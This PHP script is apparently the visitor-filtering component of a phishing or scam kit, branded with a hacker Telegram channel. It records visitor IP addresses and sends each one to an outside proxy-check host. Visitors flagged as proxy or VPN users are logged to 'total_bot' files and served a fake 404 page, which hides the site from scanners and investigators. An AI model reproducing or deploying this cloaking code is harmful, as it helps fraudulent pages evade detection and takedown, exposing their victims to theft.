<?php
/*   
TELEGRAM @H4x0rxploit
JOIN US AT TELEGRAM GROUP : https://t.me/H4x0rxploits
*/

$random_id = sha1(rand(0,1000000));
function getUserIPs()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}

$ip = getUserIPs();
if($proxyblock == 1) {
    if($ip == "127.0.0.1") {
    }else{
        $url = "http://proxy.mind-media.com/block/proxycheck.php?ip=".$ip;
        $ch = curl_init();  
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($ch);
        curl_close($ch);
        $result = $resp;
        if($result == "Y") {
            $file = fopen("proxy-block.txt","a");
            $message = $ip."\n";
            fwrite($file, $message);
            fclose($file);
            $click = fopen("result/total_bot.txt","a");
            fwrite($click,"$ip (Detect by Proxy/VPN)"."\n");
            fclose($click);
            header('HTTP/1.0 404 Not Found');
                die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this blocker server.</p><p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p></body></html>');
            exit();
        }
    }
}
?>